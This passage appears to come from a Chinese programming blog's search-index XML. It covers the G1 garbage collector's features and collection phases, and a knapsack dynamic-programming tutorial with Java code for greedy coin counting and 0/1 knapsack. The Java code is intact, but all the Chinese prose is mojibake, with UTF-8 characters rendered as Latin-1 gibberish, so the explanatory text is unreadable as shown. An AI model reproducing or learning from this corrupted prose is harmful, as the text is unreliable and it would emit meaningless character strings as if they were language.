è½¬æ¢çš„ä»»åŠ¡ï¼›å¯¹äºCç¨‹åºå‘˜æ¥è¯´ï¼Œè¦å®Œæˆè¿™æ ·çš„ç¼–ç è½¬æ¢ææ€•è¦ä¾èµ–äºunionï¼ˆè”åˆä½“&#x2F;å…±ç”¨ä½“ï¼‰å…±äº«å†…å­˜çš„ç‰¹å¾æ¥å®ç°äº†ã€‚</p><h2><span id="ä»‹ç»ä¸€ä¸‹g1åƒåœ¾å›æ”¶é›†å™¨çš„ç‰¹ç‚¹åŠåƒåœ¾å›æ”¶è¿‡ç¨‹">ä»‹ç»ä¸€ä¸‹G1åƒåœ¾å›æ”¶é›†å™¨çš„ç‰¹ç‚¹ï¼ŒåŠåƒåœ¾å›æ”¶è¿‡ç¨‹</span></h2><p>G1ï¼šæ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨</p><p>ç‰¹ç‚¹ï¼š</p><p>1ã€å¹¶è¡Œå’Œå¹¶å‘ï¼šG1èƒ½å……åˆ†åˆ©ç”¨CPUã€å¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿ï¼Œä½¿ç”¨å¤šä¸ªCPUï¼ˆCPUæˆ–è€…CPUæ ¸å¿ƒï¼‰æ¥ç¼©çŸ­stop-The-Worldåœé¡¿æ—¶é—´ã€‚éƒ¨åˆ†å…¶ä»–æ”¶é›†å™¨åŸæœ¬éœ€è¦åœé¡¿Javaçº¿ç¨‹æ‰§è¡Œçš„GCåŠ¨ä½œï¼ŒG1æ”¶é›†å™¨ä»ç„¶å¯ä»¥é€šè¿‡å¹¶å‘çš„æ–¹å¼è®©javaç¨‹åºç»§ç»­æ‰§è¡Œã€‚</p><p>2ã€åˆ†ä»£æ”¶é›†ï¼šåˆ†ä»£æ¦‚å¿µåœ¨G1ä¸­ä¾ç„¶å¾—ä»¥ä¿ç•™ã€‚è™½ç„¶G1å¯ä»¥ä¸éœ€è¦å…¶å®ƒæ”¶é›†å™¨é…åˆå°±èƒ½ç‹¬ç«‹ç®¡ç†æ•´ä¸ªGCå †ï¼Œä½†å®ƒèƒ½å¤Ÿé‡‡ç”¨ä¸åŒçš„æ–¹å¼å»å¤„ç†æ–°åˆ›å»ºçš„å¯¹è±¡å’Œå·²ç»å­˜æ´»äº†ä¸€æ®µæ—¶é—´ã€ç†¬è¿‡å¤šæ¬¡GCçš„æ—§å¯¹è±¡ä»¥è·å–æ›´å¥½çš„æ”¶é›†æ•ˆæœã€‚ä¹Ÿå°±æ˜¯è¯´G1å¯ä»¥è‡ªå·±ç®¡ç†æ–°ç”Ÿä»£å’Œè€å¹´ä»£äº†ã€‚</p><p>3ã€ç©ºé—´æ•´åˆï¼šç”±äºG1ä½¿ç”¨äº†ç‹¬ç«‹åŒºåŸŸï¼ˆRegionï¼‰æ¦‚å¿µï¼ŒG1ä»æ•´ä½“æ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®°-æ•´ç†â€ç®—æ³•å®ç°æ”¶é›†ï¼Œä»å±€éƒ¨ï¼ˆä¸¤ä¸ªRegionï¼‰ä¸Šæ¥çœ‹æ˜¯åŸºäºâ€œå¤åˆ¶â€ç®—æ³•å®ç°çš„ï¼Œä½†æ— è®ºå¦‚ä½•ï¼Œè¿™ä¸¤ç§ç®—æ³•éƒ½æ„å‘³ç€G1è¿ä½œæœŸé—´ä¸ä¼šäº§ç”Ÿå†…å­˜ç©ºé—´ç¢ç‰‡ã€‚</p><p>4ã€å¯é¢„æµ‹çš„åœé¡¿ï¼šè¿™æ˜¯G1ç›¸å¯¹äºCMSçš„å¦ä¸€å¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯G1å’ŒCMSå…±åŒçš„å…³æ³¨ç‚¹ï¼Œä½†G1é™¤äº†è¿½æ±‚ä½åœé¡¿å¤–ï¼Œè¿˜èƒ½å»ºç«‹å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹ï¼Œèƒ½è®©ä½¿ç”¨è¿™æ˜ç¡®æŒ‡å®šä¸€ä¸ªé•¿åº¦ä¸ºMæ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨åƒåœ¾æ”¶é›†ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡Næ¯«ç§’ã€‚</p><p>ä¸å…¶å®ƒæ”¶é›†å™¨ç›¸æ¯”ï¼ŒG1å˜åŒ–è¾ƒå¤§çš„æ˜¯å®ƒå°†æ•´ä¸ªJavaå †åˆ’åˆ†ä¸ºå¤šä¸ªå¤§å°ç›¸ç­‰çš„ç‹¬ç«‹åŒºåŸŸï¼ˆRegionï¼‰ï¼Œè™½ç„¶è¿˜ä¿ç•™äº†æ–°ç”Ÿä»£å’Œæ¥å¹´ä»£çš„æ¦‚å¿µï¼Œä½†æ–°ç”Ÿä»£å’Œè€å¹´ä»£ä¸å†æ˜¯ç‰©ç†éš”ç¦»çš„äº†å®ƒä»¬éƒ½æ˜¯ä¸€éƒ¨åˆ†Regionï¼ˆä¸éœ€è¦è¿ç»­ï¼‰çš„é›†åˆã€‚åŒæ—¶ï¼Œä¸ºäº†é¿å…å…¨å †æ‰«æï¼ŒG1ä½¿ç”¨äº†Remembered Setæ¥ç®¡ç†ç›¸å…³çš„å¯¹è±¡å¼•ç”¨ä¿¡æ¯ã€‚å½“è¿›è¡Œå†…å­˜å›æ”¶æ—¶ï¼Œåœ¨GCæ ¹èŠ‚ç‚¹çš„æšä¸¾èŒƒå›´ä¸­åŠ å…¥Remembered Setå³å¯ä¿è¯ä¸å¯¹å…¨å †æ‰«æä¹Ÿä¸ä¼šæœ‰é—æ¼äº†ã€‚</p><p>å¦‚æœä¸è®¡ç®—ç»´æŠ¤Remembered Setçš„æ“ä½œï¼ŒG1æ”¶é›†å™¨çš„è¿ä½œå¤§è‡´å¯åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><p>1ã€åˆå§‹æ ‡è®°ï¼ˆInitial Makingï¼‰</p><p>2ã€å¹¶å‘æ ‡è®°ï¼ˆConcurrent Markingï¼‰</p><p>3ã€æœ€ç»ˆæ ‡è®°ï¼ˆFinal Markingï¼‰</p><p>4ã€ç­›é€‰å›æ”¶ï¼ˆLive Data Counting and Evacuationï¼‰</p><p>çœ‹ä¸Šå»è·ŸCMSæ”¶é›†å™¨çš„è¿ä½œè¿‡ç¨‹æœ‰å‡ åˆ†ç›¸ä¼¼ï¼Œä¸è¿‡ç¡®å®ä¹Ÿè¿™æ ·ã€‚åˆå§‹é˜¶æ®µä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹GC Rootsèƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œå¹¶ä¸”ä¿®æ”¹TAMSï¼ˆNext Top Mark Startï¼‰çš„å€¼ï¼Œè®©ä¸‹ä¸€é˜¶æ®µç”¨æˆ·ç¨‹åºå¹¶å‘è¿è¡Œæ—¶ï¼Œèƒ½åœ¨æ­£ç¡®å¯ä»¥ç”¨çš„Regionä¸­åˆ›å»ºæ–°å¯¹è±¡ï¼Œè¿™ä¸ªé˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†è€—æ—¶å¾ˆçŸ­ã€‚å¹¶å‘æ ‡è®°é˜¶æ®µæ˜¯ä»GC Rootså¼€å§‹å¯¹å †ä¸­å¯¹è±¡è¿›è¡Œå¯è¾¾æ€§åˆ†æï¼Œæ‰¾å‡ºå­˜æ´»å¯¹è±¡ï¼Œè¿™ä¸€é˜¶æ®µè€—æ—¶è¾ƒé•¿ä½†èƒ½ä¸ç”¨æˆ·çº¿ç¨‹å¹¶å‘è¿è¡Œã€‚è€Œæœ€ç»ˆæ ‡è®°é˜¶æ®µéœ€è¦å§Remembered Set Logsçš„æ•°æ®åˆå¹¶åˆ°Remembered Setä¸­ï¼Œè¿™é˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†å¯å¹¶è¡Œæ‰§è¡Œã€‚æœ€åç­›é€‰å›æ”¶é˜¶æ®µé¦–å…ˆå¯¹å„ä¸ªRegionçš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„GCåœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ï¼Œè¿™ä¸€è¿‡ç¨‹åŒæ ·æ˜¯éœ€è¦åœé¡¿çº¿ç¨‹çš„ï¼Œä½†Sunå…¬å¸é€éœ²è¿™ä¸ªé˜¶æ®µå…¶å®ä¹Ÿå¯ä»¥åšåˆ°å¹¶å‘ï¼Œä½†è€ƒè™‘åˆ°åœé¡¿çº¿ç¨‹å°†å¤§å¹…åº¦æé«˜æ”¶é›†æ•ˆç‡ï¼Œæ‰€ä»¥é€‰æ‹©åœé¡¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¢è¯•é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’ä¹‹èƒŒåŒ…é—®é¢˜</title>
      <link href="/2020/03/23/knap/"/>
      <url>/2020/03/23/knap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>å°½å¯èƒ½è¯¦ç»†çš„è®²æ¸…æ¥šèƒŒåŒ…é—®é¢˜ï¼Œä»¥åŠæˆ‘æ‰€è¸©è¿‡çš„å‘ã€‚</p><p>èƒŒåŒ…é—®é¢˜çœ‹æœ¬æ–‡å°±å¤Ÿäº†ï¼Œä¸€å…±6é¢˜ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E5%85%A5%E9%97%A8%E6%A0%B7%E4%BE%8B">å…¥é—¨æ ·ä¾‹</a></li><li><a href="#01%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98">01èƒŒåŒ…é—®é¢˜</a></li><li><a href="#%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98">å®Œå…¨èƒŒåŒ…é—®é¢˜</a></li><li><a href="#%E5%87%91%E6%95%B0%E9%97%AE%E9%A2%98">å‡‘æ•°é—®é¢˜</a></li><li><a href="#leetcode-518-coin-change2">Leetcode 518 Coin Change2</a></li><li><a href="#%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98">å¤šé‡èƒŒåŒ…é—®é¢˜</a></li><li><a href="#494-target-sum">494. Target Sum</a></li><li><a href="#377-combination-sum-iv">377. Combination Sum IV</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><!-- tocstop --><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€é“é›¶é’±å‡‘æ•´é—®é¢˜ï¼š</p><h2><span id="å…¥é—¨æ ·ä¾‹">å…¥é—¨æ ·ä¾‹</span></h2><p>â€¢ç»™å®šé¢å€¼åˆ†åˆ«ä¸º1,4,16,64çš„ç¡¬å¸ï¼Œæ¯ç§ç¡¬å¸æœ‰æ— é™ä¸ªï¼Œç»™å®šä¸€ä¸ªNï¼Œæ±‚ç»„æˆNæœ€å°‘éœ€è¦çš„ç¡¬å¸çš„æ•°é‡ï¼Œè‹¥æ— æ³•ç»„æˆåˆ™è¿”å›-1.</p><p>æ³¨æ„ï¼Œè¿™é¢˜ä¸­çš„ç¡¬å¸éƒ½æ˜¯2çš„næ¬¡æ–¹ï¼Œï¼ˆå‰ä¸€ä¸ªæ•°æ˜¯åä¸€ä¸ªæ•°çš„ä¸¤å€æˆ–ä»¥ä¸Šï¼‰å› æ­¤å¯ä»¥ä½¿ç”¨è´ªå¿ƒç®—æ³•ã€‚</p><p>è´ªå¿ƒç®—æ³•å’ŒåŠ¨æ€è§„åˆ’çš„å…³ç³»å°±æ˜¯å¯ä»¥ç”¨è´ªå¿ƒç®—æ³•åšçš„é¢˜ä¸€å®šå¯ä»¥ç”¨åŠ¨æ€è§„åˆ’åšå‡ºæ¥ï¼Œä½†æ˜¯èƒ½ç”¨åŠ¨æ€è§„åˆ’åšå‡ºæ¥çš„é¢˜ä¸ä¸€å®šèƒ½ç”¨è´ªå¿ƒç®—æ³•åšå‡ºæ¥ã€‚</p><p>è¿™é‡Œä¸Šä¸€å¼ è´ªå¿ƒå’ŒåŠ¨æ€è§„åˆ’çš„å›¾ï¼š</p><p><img src="/2020/03/23/knap/image-20200324092356133.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">coins</span><span class="params">(<span class="type">int</span> N)</span>&#123;</span><br><span class="line">    <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] val=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">64</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=val.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(N&gt;=val[i])&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> N/val[i];</span><br><span class="line">            cnt+=n;</span><br><span class="line">            N=N%val[i];</span><br><span class="line">            <span class="keyword">if</span> (N==<span class="number">0</span>) <span class="keyword">return</span> cnt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åä¾‹</strong>ï¼šå‡è®¾ç»™çš„ç¡¬å¸é¢å€¼ä¸º1ï¼Œ9ï¼Œ10ã€‚è¦æ±‚å»å‡‘18å…ƒã€‚</p><p>è´ªå¿ƒçš„è§£åº”è¯¥æ˜¯å–1ä¸ª10å’Œ8ä¸ª1ç­”æ¡ˆæ˜¯9ï¼Œä½†æ˜¯æ­£ç¡®ç­”æ¡ˆå…¶å®æ˜¯å–2ä¸ª9ã€‚</p><p><strong>å…ˆå°†é›¶é’±å‡‘æ•´é—®é¢˜æ”¾ä¸€æ”¾ï¼Œæ¥çœ‹ä¸‹é¢ä¸€é“é¢˜</strong></p><h2><span id="01èƒŒåŒ…é—®é¢˜">01èƒŒåŒ…é—®é¢˜</span></h2><p>ç»™å®šnä»¶ç‰©å“ï¼Œç¬¬iä»¶ç‰©å“çš„ä»·å€¼ä¸ºv[i]ï¼Œä½“ç§¯ä¸ºw[i]ï¼Œç°åœ¨æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªå®¹é‡ä¸ºVçš„èƒŒåŒ…ã€‚</p><p>æ±‚èƒ½è·å¾—çš„æœ€å¤§ä»·å€¼ï¼Œä¸ä¸€å®šè£…æ»¡ã€‚</p><br><p>åœ¨å›ç­”é—®é¢˜ä¹‹å‰ï¼Œå…ˆè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯01èƒŒåŒ…é—®é¢˜ï¼š<strong>å³å¯¹äºæ¯ä»¶ç‰©å“æ¥è¯´æˆ‘ä»¬è¦ä¹ˆæ‹¿è¦ä¹ˆä¸æ‹¿ï¼Œæ¯ä»¶ç‰©å“è¦ä¹ˆæ‹¿1ä»¶è¦ä¹ˆæ‹¿0ä»¶ã€‚</strong></p><p>äº†è§£å®Œå®šä¹‰ä¹‹åæˆ‘ä»¬å¼€å§‹è§£è¿™é“é¢˜ï¼š</p><p>è¿˜æ˜¯è€æ–¹æ³•è§£åŠ¨æ€è§„åˆ’é—®é¢˜ä¸‰éƒ¨æ›²ï¼š</p><ol><li><p>ä¸‹å®šä¹‰  </p><p>é¦–å…ˆæ±‚ä»€ä¹ˆæˆ‘ä»¬å®šä¹‰ä»€ä¹ˆã€‚æˆ‘ä»¬å®šä¹‰dp[i][j]ä¸ºè½®åˆ°ç¬¬iä»¶ç‰©å“ä¸”èƒŒåŒ…è¿˜å‰©ä¸‹jå•ä½ç©ºé—´æ—¶æ‰€å¾—åˆ°çš„æœ€å¤§ä»·å€¼ã€‚</p></li><li><p>å†™é€’æ¨å¼</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è½®åˆ°ç¬¬iä»¶ç‰©å“çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ‹¿æˆ–è€…ä¸æ‹¿ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ä»·å€¼dp[i][j]å°±è¦ä¹ˆæ˜¯æ‹¿äº†ç¬¬iä»¶ç‰©å“ï¼Œæˆ–è€…ä¸æ‹¿ç¬¬iä»¶ç‰©å“æ—¶çš„æœ€å¤§ä»·å€¼å³ï¼š</p><p>$$<br> dp[i][j]&#x3D;Max(dp[i-1][j],dp[i-1][j-w[i]]+v[i])<br>$$</p><br></li><li><p>è€ƒè™‘åˆå§‹æ¡ä»¶</p><p>æœ¬é¢˜ä¸éœ€è¦è€ƒè™‘ç‰¹æ®Šåˆå§‹æ¡ä»¶</p></li></ol><p>æŠ€å·§ï¼šæœ‰æ—¶å€™DPéœ€è¦åˆå§‹åŒ–ç¬¬ä¸€è¡Œæˆ–è€…ç¬¬ä¸€åˆ—ï¼Œå› ä¸ºæœ‰æ—¶å€™æ•°ç»„ä¸‹æ ‡å¯èƒ½è¶Šç•Œï¼ŒæŠ€å·§å°±æ˜¯å¤šç”³è¯·ä¸€è¡Œæˆ–è€…ä¸€åˆ—ç©ºé—´ï¼Œå¹¶åˆå§‹åŒ–ä¸º0ï¼Œè¿™æ ·å¯ä»¥ä¾é è¿™ç¬¬0è¡Œæ¥åˆå§‹åŒ–ç¬¬ä¸€è¡Œçš„å€¼ã€‚ä¾‹å¦‚ç¬¬ä¸€è¡Œå€¼ä¾é é€’æ¨å¼å–å†³äºä¸Šä¸€è¡Œçš„å€¼ã€‚</p><p>ä»¥èƒŒåŒ…å®¹é‡ä¸º10ï¼Œç‰©å“å¤§å°å’Œä»·å€¼åˆ†åˆ«æ˜¯A{3,4}ï¼ŒB{4,5}ï¼ŒC{5,6}ã€‚æ¨¡æ‹Ÿèµ°ä¸€éæµç¨‹ï¼š</p><p><img src="/2020/03/23/knap/image-20200324095911869.png"></p><p>å…¶å®æˆ‘ä»¬å¯ä»¥ä»é€’æ¨å¼çœ‹å‡ºï¼Œå½“å•†å“iä¸º0çš„æ—¶å€™é€’æ¨å¼å˜æˆäº†</p><p>dp[0][j]&#x3D;Max(dp[-1][j],dp[-1][j-w[0]]+v[0])ï¼Œå› æ­¤æˆ‘ä»¬æ–°å»ºäº†ä¸€è¡Œ0æ¥ä¿è¯æ•°ç»„ä¸è¶Šç•Œï¼Œä½†æ˜¯æ­¤æ—¶ç¬¬iä»¶ç‰©å“è¿˜æ˜¯ä»0å¼€å§‹åˆ°n-1ï¼Œè€Œdpçš„iå·²ç»å˜æˆ1åˆ°näº†ã€‚</p><p>å› æ­¤é€’æ¨å¼ä¼šæœ‰ä¸€ç‚¹å°å°å˜åŒ–ï¼š</p><p>å½“j&gt;&#x3D;w[i]æ—¶<br>$$<br>dp[i][j]&#x3D;Max(dp[i-1][j],dp[i-1][j-w[i-1]]+v[i-1])<br>$$<br>else<br>$$<br>dp[i][j]&#x3D;dp[i-1][j]<br>$$</p><p>å³dp[1]å¯¹åº”ç‰©å“w[0]å’Œv[0]ï¼Œä¸€å¼€å§‹çœ‹ä¼šæœ‰ç‚¹åˆ«æ‰­ï¼Œåšå¤šäº†å°±ä¹ æƒ¯äº†ã€‚</p><p>æ‰€ä»¥ç»™å‡ºè§£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">knapsack</span><span class="params">(<span class="type">int</span>[] v,<span class="type">int</span>[] w,<span class="type">int</span> V)</span>&#123;</span><br><span class="line">        <span class="type">int</span> [][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[v.length+<span class="number">1</span>][V+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;v.length+<span class="number">1</span> ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;V+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(w[i-<span class="number">1</span>]&lt;=j)</span><br><span class="line">                    dp[i][j]=Math.max(dp[i-<span class="number">1</span>][j],dp[i-<span class="number">1</span>][j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[v.length][V];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> w[] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>&#125;;</span><br><span class="line">        <span class="type">int</span> v[] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">12</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>&#125;;</span><br><span class="line">        System.out.println(knapsack(v,w,<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œdp[i][]åªæ˜¯ä¾èµ–åˆ°äº†dp[i-1][]ï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥å»ä¼˜åŒ–ã€‚</p><p>å› ä¸ºæ˜¯äºŒç»´çš„dpï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®é€’æ¨å¼å¾—åˆ°dp[i][j]æ€»æ˜¯ä¾èµ–äºä¸Šä¸€è¡Œçš„dp[i-1][j]ä»¥åŠdp[i-1][j-w[i]]ï¼Œè€Œä¹‹å‰è¯´è¿‡æ»šåŠ¨æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ç»´dpæ¥ä»£æ›¿äºŒç»´dpã€‚</p><p>å½“j&gt;&#x3D;w[i]æ—¶<br>$$<br>dp[j]&#x3D;Math.max(dp[j],dp[j-w[i]]+v[i]);<br>$$<br>else<br>$$<br>dp[j]&#x3D;dp[j]<br>$$<br>å¹¶ä¸”ç”±äºæ–°å»ºçš„æ•°å­—é»˜è®¤å¡«å……0ï¼Œå› æ­¤æˆ‘ä»¬éƒ½ä¸éœ€è¦æ–°å¼€ä¸€è¡Œæ•°æ®ï¼Œæˆ–è€…æ¢å¥è¯è¯´ä¸éœ€è¦åˆå§‹åŒ–æ•°ç»„ã€‚</p><p>ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯å½“æˆ‘ä»¬è®¡ç®—dp[j]çš„æ—¶å€™è¦ä¾èµ–äºä¸Šä¸€è¡Œçš„dp[j]ï¼ˆåœ¨è¿™é‡Œæ²¡æ¯›ç—…ï¼Œå› ä¸ºè®¡ç®—dp[j]çš„æ—¶å€™åœ¨dpæ•°ç»„ä¸­jè¿™ä¸ªä½ç½®ä¿å­˜çš„è¿˜æ˜¯ä¸Šä¸€è¡Œçš„å€¼ï¼‰å’Œdp[j-w[i]]ï¼ˆè¿™å°±æœ‰é—®é¢˜äº†ï¼Œå‡è®¾w[i]ä¸º1ï¼Œé‚£ä¹ˆdp[j]ä¾èµ–äºä¸Šä¸€è¡Œçš„dp[j-1]ï¼Œè¿™åœ¨äºŒç»´çš„dpé‡Œé¢æ˜¯æ²¡æ¯›ç—…çš„ï¼Œä½†ä¸€ç»´dpä¸­æˆ‘ä»¬åœ¨è®¡ç®—dp[j]çš„æ—¶å€™å…¶å®å·²ç»å°†dp[j-1]ä¹Ÿæ›´æ–°è¿‡äº†ï¼Œä¸å†æ˜¯ä¸Šä¸€è¡Œçš„å€¼ï¼Œè€Œæ˜¯å½“å‰è¡Œçš„å€¼ï¼Œå› æ­¤å°±ä¼šå‡ºé—®é¢˜ï¼‰ã€‚</p><p><img src="/2020/03/23/knap/image-20200324102413012.png"></p><p>å‡è®¾æˆ‘ä»¬æ›´æ–°b5çš„å€¼ï¼Œb5&#x3D;a5+b4ã€‚ç”±äºæ­¤æ—¶b5&#x3D;&#x3D;a5ï¼Œå› æ­¤å¯ä»¥é€šè¿‡b5&#x3D;b5+b4æ¥åšåˆ°ï¼Œå»æ‰aè¿™ä¸€è¡Œã€‚</p><p>ç›¸å¯¹äºæ˜¯å°†äºŒç»´è½¬ä¸€ç»´ã€‚</p><p>ä½†æ˜¯å¦‚æœb5&#x3D;a3+xï¼Œç”±äºa3å·²ç»è¢«è¦†ç›–æˆb3å› æ­¤æˆ‘ä»¬æ‹¿ä¸åˆ°ã€‚æ‰€ä»¥éœ€è¦åå‘éå†, ä¿è¯ä¹‹å‰çš„å€¼æ²¡æœ‰è¢«è¦†ç›–è¿‡</p><p><img src="/2020/03/23/knap/abcd.jpg"></p><p>è§£å†³æ–¹æ¡ˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå…¶å®å°±æ˜¯æˆ‘ä»¬éå†æ•°ç»„çš„æ—¶å€™ä½¿ç”¨å€’åºçš„æ–¹æ³•ï¼Œå³å…ˆéå†dp[j]å†éå†dp[j-1]ï¼Œå› ä¸ºdp[j-1]ä¸ä¾èµ–äºæ•°ç»„ä¸‹æ ‡å¤§äºj-1çš„ä½ç½®çš„å€¼ï¼Œå› æ­¤å¯ä»¥åšåˆ°ã€‚</p><p>ä¸‹é¢ç»™å‡ºé€æ­¥ä¼˜åŒ–çš„è¿‡ç¨‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">knaps2</span><span class="params">(<span class="type">int</span>[] v, <span class="type">int</span>[] w, <span class="type">int</span> V)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[V + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; v.length + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> V; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°iæ˜¯ä»1å¼€å§‹çš„ï¼Œä½†æ˜¯é€’æ¨å¼é‡Œé¢å¹¶æ²¡æœ‰içš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬è¿˜å¯ä»¥å†™æˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">knaps1</span><span class="params">(<span class="type">int</span>[] v, <span class="type">int</span>[] w, <span class="type">int</span> V)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[V + <span 